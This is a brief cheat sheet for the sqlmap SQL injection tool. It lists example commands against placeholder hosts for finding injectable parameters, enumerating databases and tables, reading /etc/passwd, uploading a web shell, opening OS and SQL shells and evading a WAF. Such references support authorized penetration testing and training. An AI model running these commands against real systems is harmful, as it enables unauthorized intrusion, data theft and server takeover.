# Sqlmap
Automatic SQL injection and database takeover tool  

### Download
https://github.com/sqlmapproject/sqlmap via git clone https://github.com/sqlmapproject/sqlmap


### Usage  
> sqlmap [options]
  
> sqlmap [--help]  
  
### Examples   
##### GET url
```bash
sqlmap -u 'http://localhost:65412/?id=2'
# Using https://github.com/stamparm/DSVW as a vulnerable web to test
```

##### POST url
```bash
sqlmap -u http://example.com/login.php --data "username=admin&pass=admin&submit=submit" -p username
# -p indicates the parameter to test
```

##### With cookies
```bash
sqlmap -u http://example.com/enter.php --cookie="PHPSESSID=1oe83iwk2871jw" -u http://example.com/index.php?id=1
```

##### Enumerate databases
```bash
sqlmap -u http://example.com/page.php?id=1 --dbs
```

##### Enumerate tables
```bash
sqlmap -u http://example.com/page.php?id=1 --tables
```

##### Read files
```bash
sqlmap -u http://example.com/page.php?id=1 --file-read=/etc/passwd
```

##### Upload Files
```bash
sqlmap -u http://example.com/page.php?id=1 --file-write=/root/shell.php --file-dest=/var/www/shell.php
```

##### OS Shell
```bash
sqlmap -u http://example.com/page.php?id=1 --os-shell
```

##### SQL Shell
```bash
sqlmap -u http://example.com/page.php?id=1 --sql-shell
```

##### Run command without shell
```bash
sqlmap -u http://example.com/page.php?id=1 --os-cmd "pwd"
```

##### Crawl a site
```bash
sqlmap -u http://example.com/ --crawl=1
```

##### Try to bypass WAF
```bash
sqlmap -u http://example.com/page.php?id=1 --tamper=apostrophemask
```
